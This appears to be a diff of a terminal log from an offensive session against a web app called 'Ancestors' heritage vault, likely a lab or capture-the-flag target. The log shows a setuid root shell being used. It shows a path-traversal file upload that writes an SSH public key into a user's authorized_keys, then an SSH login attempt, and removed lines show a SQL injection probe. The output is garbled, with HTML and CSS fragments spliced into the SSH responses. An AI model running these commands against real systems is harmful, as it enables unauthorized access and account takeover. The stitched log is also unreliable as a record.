@@ -1,7 +1,18 @@
+Warning: Identity file /home/collector/id_ed25519_collector not accessible: No such file or directory.
+The authenticity of host '[172.28.2.2]:2222 ([172.28.2.2]:2222)' can't be established.
+ED25519 key fingerprint is SHA256:P794Nyfvvc/QWrU6astYm8X4G9IuGfMBTem4Qj/DMNY.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? y
+Please type 'yes', 'no' or the fingerprint: yes
+Warning: Permanently added '[172.28.2.2]:2222' (ED25519) to the list of known hosts.
+collector@172.28.2.2: Permission denied (publickey).
+scp: Connection closed
+collector@loot:~$ /tmp/rootbash -p -c 'ssh-keygen -t ed25519 -N "" -f /tmp/k2 -C lvl2 >/dev/null; U=https://10.96.4.2/upload; H="Host: ancestors.var"; echo ===BENIN===; curl -sk -m 8 -X POST $U -H "$H" -F "title=Probe" -F "collection=nordic" -F "doc_file=@/etc/hostname;filename=probe.txt"; echo; echo ===TRAVERSAL_TOMA===; curl -sk -m 8 -X POST $U -H "$H" -F "title=Heritage Key" -F "collection=nordic" -F "doc_file=@/tmp/k2.pub;filename=../../home/toma/.ssh/authorized_keys"; echo; echo ===SSH_TOMA===; ssh -i /tmp/k2 -o StrictHostKeyChecking=no -o ConnectTimeout=6 toma@10.96.4.2 "id; ls -la ~/" 2>&1 | head -20'
+===BENIN===
 <!doctype html>
 <html lang="en"><head>
 <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Ancestors — Dashboard</title>
+<title>Ancestors — Uploaded</title>
 <style>
   *{box-sizing:border-box;margin:0}
   body{background:#f4f1ec;color:#3a3630;font-family:Georgia,'Times New Roman',serif;min-height:100vh}
@@ -54,62 +65,161 @@
 </style>
 </head><body>
 <header><div class="logo">A</div><h1>Ancestors</h1></header>
-<nav><a href="/" class="active">Dashboard</a><a href="/collections" class="">Collections</a><a href="/upload" class="">Upload</a></nav>
+<nav><a href="/" class="">Dashboard</a><a href="/collections" class="">Collections</a><a href="/upload" class="active">Upload</a></nav>
 <main>
-    <div class="hero">
-      <h2>Heritage Document Vault</h2>
-      <p>Secure archival and retrieval platform for genealogical records, historical documents, and legacy data preservation.</p>
-    </div>
-    <form class="search" action="/search" method="get">
-      <input type="text" name="q" placeholder="Search records by name, date, or keyword..." value="">
-      <button type="submit">Search</button>
-    </form>
+    <a href="/upload" class="back">&larr; Upload another</a>
+    <div class="alert ok">Document &ldquo;Probe&rdquo; uploaded successfully and queued for review in <strong>Nordic Archives</strong>.</div>
+    <div class="hero"><h2>Upload Complete</h2><p>Your document has been queued with status <span class="tag pending">pending</span>. An archivist will review and classify it shortly.</p></div>
     <div class="grid">
-      <div class="card"><div class="count">12</div><h3>Documents</h3><p>Total records in the vault.</p></div>
-      <div class="card"><div class="count">4</div><h3>Collections</h3><p>Active archival collections.</p></div>
-      <div class="card"><div class="count">4</div><h3>Pending</h3><p>Awaiting review or processing.</p></div>
-      <div class="card"><div class="count">8</div><h3>Verified</h3><p>Authenticated and catalogued.</p></div>
-    </div>
-    <div class="section"><h2>Recent Activity</h2>
-    <table><thead><tr><th>Document</th><th>Collection</th><th>Date</th><th>Status</th></tr></thead><tbody><tr><td>Lindqvist Estate Deed (1934)</td><td>Nordic Archives</td><td>2026-07-18</td><td><span class="tag verified">verified</span></td></tr><tr><td>Bergstrom Family Photo Album</td><td>Nordic Archives</td><td>2026-07-15</td><td><span class="tag processing">processing</span></td></tr><tr><td>Parish Records — Varelid 1880-1920</td><td>Church Records</td><td>2026-07-12</td><td><span class="tag verified">verified</span></td></tr><tr><td>Immigration Manifest SS Helvig</td><td>Maritime</td><td>2026-07-09</td><td><span class="tag pending">pending</span></td></tr><tr><td>Census Extract — Lynx County 1910</td><td>Government</td><td>2026-07-04</td><td><span class="tag verified">verified</span></td></tr></tbody></table></div></main>
+      <a href="/" class="card"><h3>Dashboard</h3><p>View all records</p></a>
+      <a href="/collections/nordic" class="card"><h3>Nordic Archives</h3><p>Browse this collection</p></a>
+    </div></main>
 <footer>&copy; 2026 Ancestors Heritage Vault &mdash; ancestors.var/cms-3.2</footer>
-</body></html>coll/tmp/rootbash -p -c 'echo ===COLLECTIONS===; curl -sk -m 6 https://10.96.4.2/collections -H "Host: ancestors.var" | sed -n "/<main/,/<\/main>/p" | head -c 1500; echo; echo ===SEARCH_TEST===; curl -sk -m 6 "https://10.96.4.2/search?q=test" -H "Host: ancestors.var" | sed -n "/<main/,/<\/main>/p" | head -c 1200; echo; echo ===SEARCH_SQLI===; curl -sk -m 6 "https://10.96.4.2/search?q=%27%20OR%201%3D1--" -H "Host: ancestors.var" | sed -n "/<main/,/<\/main>/p" | head -c 1200; echo; echo ===UPLOAD===; curl -sk -m 6 https://10.96.4.2/upload -H "Host: ancestors.var" | sed -n "/<main/,/<\/main>/p" | head -c 1200' head -c 1200'
-===COLLECTIONS===
+</body></html>
+===TRAVERSAL_TOMA===
+<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Ancestors — Uploaded</title>
+<style>
+  *{box-sizing:border-box;margin:0}
+  body{background:#f4f1ec;color:#3a3630;font-family:Georgia,'Times New Roman',serif;min-height:100vh}
+  header{background:#2c2520;color:#d4c8b8;padding:1.2rem 2rem;display:flex;align-items:center;gap:1rem}
+  header h1{font-size:1.1rem;letter-spacing:.08em;font-weight:400}
+  header .logo{width:32px;height:32px;border-radius:50%;background:#8b7355;display:grid;place-items:center;font-size:.9rem;color:#f4f1ec}
+  nav{background:#3a332c;display:flex;gap:0;padding:0 2rem}
+  nav a{color:#b8a88a;text-decoration:none;padding:.7rem 1.2rem;font-size:.82rem;letter-spacing:.06em;border-bottom:2px solid transparent}
+  nav a.active{color:#f4f1ec;border-bottom-color:#c9a96e}
+  nav a:hover{color:#f4f1ec}
+  main{max-width:900px;margin:2rem auto;padding:0 2rem}
+  .hero{background:#fff;border:1px solid #d4c8b8;border-radius:6px;padding:2rem;margin-bottom:1.5rem}
+  .hero h2{font-size:1.3rem;color:#5a4a38;margin-bottom:.6rem}
+  .hero p{font-size:.9rem;line-height:1.7;color:#6a5e50}
+  .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:1rem;margin-top:1.5rem}
+  .card{background:#fff;border:1px solid #d4c8b8;border-radius:6px;padding:1.3rem;text-decoration:none;color:inherit;display:block}
+  .card:hover{border-color:#c9a96e;box-shadow:0 2px 8px rgba(0,0,0,.06)}
+  .card h3{font-size:.85rem;color:#5a4a38;letter-spacing:.04em;margin-bottom:.4rem}
+  .card p{font-size:.78rem;color:#8a7e70;line-height:1.6}
+  .card .count{font-size:1.6rem;color:#c9a96e;font-weight:700;margin-bottom:.3rem}
+  .card .icon{font-size:1.4rem;margin-bottom:.4rem}
+  .search{display:flex;gap:.5rem;margin-top:1.5rem}
+  .search input{flex:1;padding:.6rem .8rem;border:1px solid #c9b896;border-radius:4px;font-family:inherit;font-size:.85rem;background:#faf8f4}
+  .search button{background:#5a4a38;color:#f4f1ec;border:0;border-radius:4px;padding:.6rem 1.2rem;font-family:inherit;cursor:pointer;font-size:.82rem}
+  .search button:hover{background:#6a5a48}
+  .section{margin-top:2rem}
+  .section h2{font-size:.72rem;letter-spacing:.14em;text-transform:uppercase;color:#8a7e70;margin-bottom:.8rem}
+  table{width:100%;border-collapse:collapse;font-size:.82rem;background:#fff;border:1px solid #d4c8b8;border-radius:6px;overflow:hidden}
+  th,td{text-align:left;padding:.55rem .8rem;border-bottom:1px solid #ece6dc}
+  th{background:#f9f6f1;color:#8a7e70;font-size:.68rem;letter-spacing:.1em;text-transform:uppercase;font-weight:600}
+  tr:last-child td{border-bottom:0}
+  .tag{font-size:.62rem;background:#e8dfd2;color:#6a5e50;padding:.15rem .4rem;border-radius:3px;letter-spacing:.04em}
+  .tag.verified{background:#dcefd8;color:#3a6a32}
+  .tag.pending{background:#fcecd4;color:#8a6830}
+  .tag.processing{background:#d8e4f0;color:#385a7a}
+  footer{text-align:center;padding:2rem;font-size:.7rem;color:#a89880;letter-spacing:.06em}
+  label{display:block;font-size:.72rem;color:#8a7e70;letter-spacing:.08em;text-transform:uppercase;margin:.8rem 0 .3rem}
+  input[type=text],select,textarea{width:100%;padding:.55rem .7rem;border:1px solid #c9b896;border-radius:4px;font-family:inherit;font-size:.85rem;background:#faf8f4}
+  textarea{min-height:80px;resize:vertical}
+  input[type=file]{font-family:inherit;font-size:.82rem;margin-top:.2rem}
+  .btn{background:#5a4a38;color:#f4f1ec;border:0;border-radius:4px;padding:.6rem 1.4rem;font-family:inherit;cursor:pointer;font-size:.85rem;margin-top:1rem}
+  .btn:hover{background:#6a5a48}
+  .alert{padding:.7rem 1rem;border-radius:5px;font-size:.85rem;margin-bottom:1.2rem}
+  .alert.ok{background:#dcefd8;border:1px solid #a8d4a0;color:#2a5a22}
+  .alert.info{background:#d8e4f0;border:1px solid #90b0d0;color:#2a4a6a}
+  .empty{text-align:center;padding:2rem;color:#a89880;font-style:italic;font-size:.9rem}
+  .back{font-size:.82rem;color:#8b7355;text-decoration:none;display:inline-block;margin-bottom:1rem}
+  .back:hover{color:#5a4a38}
+  .doc-notes{font-size:.78rem;color:#8a7e70;font-style:italic}
+</style>
+</head><body>
+<header><div class="logo">A</div><h1>Ancestors</h1></header>
+<nav><a href="/" class="">Dashboard</a><a href="/collections" class="">Collections</a><a href="/upload" class="active">Upload</a></nav>
 <main>
-    <div class="hero"><h2>Collections</h2><p>Browse documents organized by category and origin.</p></div>
-    <div class="grid"><a href="/collections/nordic" class="card"><div class="icon">❄</div><div class="count">3</div><h3>Nordic Archives</h3><p>Browse 3 document(s) in this collection.</p></a><a href="/collections/church" class="card"><div class="icon">†</div><div class="count">3</div><h3>Church Records</h3><p>Browse 3 document(s) in this collection.</p></a><a href="/collections/maritime" class="card"><div class="icon">⚓</div><div class="count">3</div><h3>Maritime</h3><p>Browse 3 document(s) in this collection.</p></a><a href="/collections/government" class="card"><div class="icon">⚑</div><div class="count">3</div><h3>Government</h3><p>Browse 3 document(s) in this collection.</p></a></div></main>
+    <a href="/upload" class="back">&larr; Upload another</a>
+    <div class="alert ok">Document &ldquo;Heritage Key&rdquo; uploaded successfully and queued for review in <strong>Nordic Archives</strong>.</div>
+    <div class="hero"><h2>Upload Complete</h2><p>Your document has been queued with status <span class="tag pending">pending</span>. An archivist will review and classify it shortly.</p></div>
+    <div class="grid">
+      <a href="/" class="card"><h3>Dashboard</h3><p>View all records</p></a>
+      <a href="/collections/nordic" class="card"><h3>Nordic Archives</h3><p>Browse this collection</p></a>
+    </div></main>
+<footer>&copy; 2026 Ancestors Heritage Vault &mdash; ancestors.var/cms-3.2</footer>
+</body></html>
+===SSH_TOMA===
+Warning: Permanently added '10.96.4.2' (ED25519) to the list of known hosts.
+toma@10.96.4.2's password: 
+sparent}
+  nav a.active{color:#f4f1ec;border-bottom-color:#c9a96e}
+  nav a:hover{color:#f4f1ec}
+  main{max-width:900px;margin:2rem auto;padding:0 2rem}
+  .hero{background:#fff;border:1px solid #d4c8b8;border-radius:6px;padding:2rem;margin-bottom:1.5rem}
+  .hero h2{font-size:1.3rem;color:#5a4a38;margin-bottom:.6rem}
+  .hero p{font-size:.9rem;line-height:1.7;color:#6a5e50}
+  .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:1rem;margin-top:1.5rem}
+  .card{background:#fff;border:1px solid #d4c8b8;border-radius:6px;padding:1.3rem;text-decoration:none;color:inherit;display:block}
+  .card:hover{border-color:#c9a96e;box-shadow:0 2px 8px rgba(0,0,0,.06)}
+  .card h3{font-size:.85rem;color:#5a4a38;letter-spacing:.04em;margin-bottom:.4rem}
+  .card p{font-size:.78rem;color:#8a7e70;line-height:1.6}
+  .card .count{font-size:1.6rem;color:#c9a96e;font-weight:700;margin-bottom:.3rem}
+  .card .icon{font-size:1.4rem;margin-bottom:.4rem}
+  .search{display:flex;gap:.5rem;margin-top:1.5rem}
+  .search input{flex:1;padding:.6rem .8rem;border:1px solid #c9b896;border-radius:4px;font-family:inherit;font-size:.85rem;background:#faf8f4}
+  .search button{background:#5a4a38;color:#f4f1ec;border:0;border-radius:4px;padding:.6rem 1.2rem;font-family:inherit;cursor:pointer;font-size:.82rem}
+  .search button:hover{background:#6a5a48}
+  .section{margin-top:2rem}
+  .section h2{font-size:.72rem;letter-spacing:.14em;text-transform:uppercase;color:#8a7e70;margin-bottom:.8rem}
+  table{width:100%;border-collapse:collapse;font-size:.82rem;background:#fff;border:1px solid #d4c8b8;border-radius:6px;overflow:hidden}
+  th,td{text-align:left;padding:.55rem .8rem;border-bottom:1px solid #ece6dc}
+  th{background:#f9f6f1;color:#8a7e70;font-size:.68rem;letter-spacing:.1em;text-transform:uppercase;font-weight:600}
+  tr:last-child td{border-bottom:0}
+  .tag{font-size:.62rem;background:#e8dfd2;color:#6a5e50;padding:.15rem .4rem;border-radius:3px;letter-spacing:.04em}
+  .tag.verified{background:#dcefd8;color:#3a6a32}
+  .tag.pending{background:#fcecd4;color:#8a6830}
+  .tag.processing{background:#d8e4f0;color:#385a7a}
+  footer{text-align:center;padding:2rem;font-size:.7rem;color:#a89880;letter-spacing:.06em}
+  label{display:block;font-size:.72rem;color:#8a7e70;letter-spacing:.08em;text-transform:uppercase;margin:.8rem 0 .3rem}
+  input[type=text],select,textarea{width:100%;padding:.55rem .7rem;border:1px solid #c9b896;border-radius:4px;font-family:inherit;font-size:.85rem;background:#faf8f4}
+  textarea{min-height:80px;resize:vertical}
+  input[type=file]{font-family:inherit;font-size:.82rem;margin-top:.2rem}
+  .btn{background:#5a4a38;color:#f4f1ec;border:0;border-radius:4px;padding:.6rem 1.4rem;font-family:inherit;cursor:pointer;font-size:.85rem;margin-top:1rem}
+  .btn:hover{background:#6a5a48}
+  .alert{padding:.7rem 1rem;border-radius:5px;font-size:.85rem;margin-bottom:1.2rem}
+  .alert.ok{background:#dcefd8;border:1px solid #a8d4a0;color:#2a5a22}
+  .alert.info{background:#d8e4f0;border:1px solid #90b0d0;color:#2a4a6a}
+  .empty{text-align:center;padding:2rem;color:#a89880;font-style:italic;font-size:.9rem}
+  .back{font-size:.82rem;color:#8b7355;text-decoration:none;display:inline-block;margin-bottom:1rem}
+  .back:hover{color:#5a4a38}
+  .doc-notes{font-size:.78rem;color:#8a7e70;font-style:italic}
+</style>
+</head><body>
+<header><div class="logo">A</div><h1>Ancestors</h1></header>
+<nav><a href="/" class="">Dashboard</a><a href="/collections" class="">Collections</a><a href="/upload" class="active">Upload</a></nav>
+<main>
+    <a href="/upload" class="back">&larr; Upload another</a>
+    <div class="alert ok">Document &ldquo;Probe&rdquo; uploaded successfully and queued for review in <strong>Nordic Archives</strong>.</div>
+    <div class="hero"><h2>Upload Complete</h2><p>Your document has been queued with status <span class="tag pending">pending</span>. An archivist will review and classify it shortly.</p></div>
+    <div class="grid">
+      <a href="/" class="card"><h3>Dashboard</h3><p>View all records</p></a>
+toma@10.96.4.2's password: Permission denied, please try again.
 
-===SEARCH_TEST===
+t-size:.82rem;color:#8b7355;text-decoration:none;display:inline-block;margin-bottom:1rem}
+  .back:hover{color:#5a4a38}
+  .doc-notes{font-size:.78rem;color:#8a7e70;font-style:italic}
+</style>
+</head><body>
+<header><div class="logo">A</div><h1>Ancestors</h1></header>
+<nav><a href="/" class="">Dashboard</a><a href="/collections" class="">Collections</a><a href="/upload" class="active">Upload</a></nav>
 <main>
-    <a href="/" class="back">&larr; Dashboard</a>
-    <div class="hero"><h2>Search Results</h2><p>0 record(s) for &ldquo;test&rdquo;</p></div>
-    <form class="search" action="/search" method="get">
-      <input type="text" name="q" placeholder="Search..." value="test">
-      <button type="submit">Search</button>
-    </form>
-    <div class="section"><div class="empty">No records matching &ldquo;test&rdquo;.</div></div></main>
-
-===SEARCH_SQLI===
-<main>
-    <a href="/" class="back">&larr; Dashboard</a>
-    <div class="hero"><h2>Search Results</h2><p>0 record(s) for &ldquo;' or 1=1--&rdquo;</p></div>
-    <form class="search" action="/search" method="get">
-      <input type="text" name="q" placeholder="Search..." value="' or 1=1--">
-      <button type="submit">Search</button>
-    </form>
-    <div class="section"><div class="empty">No records matching &ldquo;' or 1=1--&rdquo;.</div></div></main>
-
-===UPLOAD===
-<main>
-    <div class="hero"><h2>Upload Document</h2><p>Add a new record to the vault. Uploaded documents are queued for review before classification.</p></div>
-    <form method="post" action="/upload" enctype="multipart/form-data" style="background:#fff;border:1px solid #d4c8b8;border-radius:6px;padding:1.5rem;max-width:500px">
-      <label>Document Title</label>
-      <input type="text" name="title" required placeholder="e.g. Birth Certificate — Anna Eriksson (1892)">
-      <label>Collection</label>
-      <select name="collection"><option value="nordic">Nordic Archives</option><option value="church">Church Records</option><option value="maritime">Maritime</option><option value="government">Government</option></select>
-      <label>Notes</label>
-      <textarea name="notes" placeholder="Optional description or provenance notes..."></textarea>
-      <label>File</label>
-      <input type="file" name="doc_file" accept=".pdf,.jpg,.jpeg,.png,.tiff,.doc,.docx">
-      <br><button type="submit" class="btn">Upload &amp; Queue for Review</button>
-    </form></main>
+    <a href="/upload" class="back">&larr; Upload another</a>
+    <div class="alert ok">Document &ldquo;Heritage Key&rdquo; uploaded successfully and queued for review in <strong>Nordic Archives</strong>.</div>
+    <div class="hero"><h2>Upload Complete</h2><p>Your document has been queued with status <span class="tag pending">pending</span>. An archivist will review and classify it shortly.</p></div>
+    <div class="grid">
+      <a href="/" class="card"><h3>Dashboard</h3><p>View all records</p></a>
+      <a href="/collections/nordic" class="card"><h3>Nordic Archives</h3><p>Browse this collection</p></a>
+    </div></main>
+<footer>&copy; 2026 Ancestors Heritage Vault &mdash; ancestors.var/cms-3.2</footer>
+</body></html>
+===SSH_TOMA===
+Warning: Permanently added '10.96.4.2' (ED25519) to the list of known hosts.
+toma@10.96.4.2's password: 
+Permission denied, please try again.
+toma@10.96.4.2's password: 
